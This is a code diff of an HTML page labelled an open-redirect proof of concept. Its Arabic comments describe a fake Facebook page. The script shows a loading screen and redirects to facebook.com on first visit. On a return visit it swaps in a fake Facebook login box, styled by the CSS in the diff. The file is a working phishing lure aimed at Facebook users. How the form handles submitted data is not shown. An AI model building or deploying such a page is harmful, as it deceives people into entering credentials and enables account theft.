@@ -4,87 +4,19 @@
 <meta charset="UTF-8">
 <title>Meta Open Redirect PoC</title>
 <style>
-    body {
-        margin: 0;
-        padding: 0;
-        background: #f0f2f5;
-        font-family: Arial, sans-serif;
-    }
-    /* شاشة الـ Loading */
-    .loading {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        color: #1877f2;
-        font-size: 18px;
-        height: 100vh;
-    }
-    .dot {
-        width: 8px;
-        height: 8px;
-        background: #1877f2;
-        border-radius: 50%;
-        animation: blink 1.2s infinite ease-in-out;
-    }
+    body { margin: 0; padding: 0; background: #f0f2f5; font-family: Arial, sans-serif; }
+    .loading { display: flex; align-items: center; justify-content: center; gap: 8px; color: #1877f2; font-size: 18px; height: 100vh; }
+    .dot { width: 8px; height: 8px; background: #1877f2; border-radius: 50%; animation: blink 1.2s infinite ease-in-out; }
     .dot:nth-child(2) { animation-delay: 0.2s; }
     .dot:nth-child(3) { animation-delay: 0.4s; }
-    @keyframes blink {
-        0%, 80%, 100% { opacity: 0; }
-        40% { opacity: 1; }
-    }
-    /* ديزاين صفحة الفيس */
-    .container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    .login-box {
-        background: white;
-        padding: 20px;
-        border-radius: 8px;
-        box-shadow: 0px 2px 8px rgba(0,0,0,0.1);
-        width: 320px;
-    }
-    .logo {
-        text-align: center;
-        font-size: 36px;
-        color: #1877f2;
-        font-weight: bold;
-        margin-bottom: 20px;
-    }
-    input {
-        width: 100%;
-        padding: 12px;
-        margin: 6px 0;
-        border: 1px solid #ddd;
-        border-radius: 6px;
-        font-size: 14px;
-    }
-    .login-btn {
-        width: 100%;
-        padding: 12px;
-        background: #1877f2;
-        color: white;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        font-weight: bold;
-        cursor: pointer;
-    }
-    .create-btn {
-        width: 100%;
-        padding: 12px;
-        background: #42b72a;
-        color: white;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        font-weight: bold;
-        margin-top: 10px;
-        cursor: pointer;
-    }
+    @keyframes blink { 0%, 80%, 100% { opacity: 0; } 40% { opacity: 1; } }
+    .container { display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0px 2px 8px rgba(0,0,0,0.1); width: 320px; }
+    .logo { text-align: center; font-size: 36px; color: #1877f2; font-weight: bold; margin-bottom: 20px; }
+    input { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
+    .login-btn, .create-btn { width: 100%; padding: 12px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+    .login-btn { background: #1877f2; color: white; }
+    .create-btn { background: #42b72a; color: white; margin-top: 10px; }
 </style>
 <script>
 function showFakeFacebook() {
@@ -101,14 +33,13 @@ function showFakeFacebook() {
     `;
 }
 
-window.onload = function () {
-    let navType = (performance.getEntriesByType("navigation")[0] || {}).type;
-
-    if (navType === "back_forward") {
-        // لو جاي من Back أو Forward → عرض الفيس المزيف مباشرة
-        showFakeFacebook();
-    } else if (!sessionStorage.getItem('redirected')) {
-        // أول مرة → Loading ثم Redirect
+// أول ما الصفحة تتفتح، قبل حتى ما يكتمل التحميل
+if (sessionStorage.getItem('redirected')) {
+    // عرض صفحة الفيس المزيف مباشرة
+    document.addEventListener("DOMContentLoaded", showFakeFacebook);
+} else {
+    // أول مرة → Loading ثم Redirect
+    document.addEventListener("DOMContentLoaded", function() {
         document.body.innerHTML = `
             <div class="loading">
                 <div class="dot"></div>
@@ -121,11 +52,8 @@ window.onload = function () {
         setTimeout(function(){
             window.location.href = "https://facebook.com/a";
         }, 1500);
-    } else {
-        // أي مرة تانية غير الـBack → عرض الفيس المزيف
-        showFakeFacebook();
-    }
-};
+    });
+}
 </script>
 </head>
 <body>
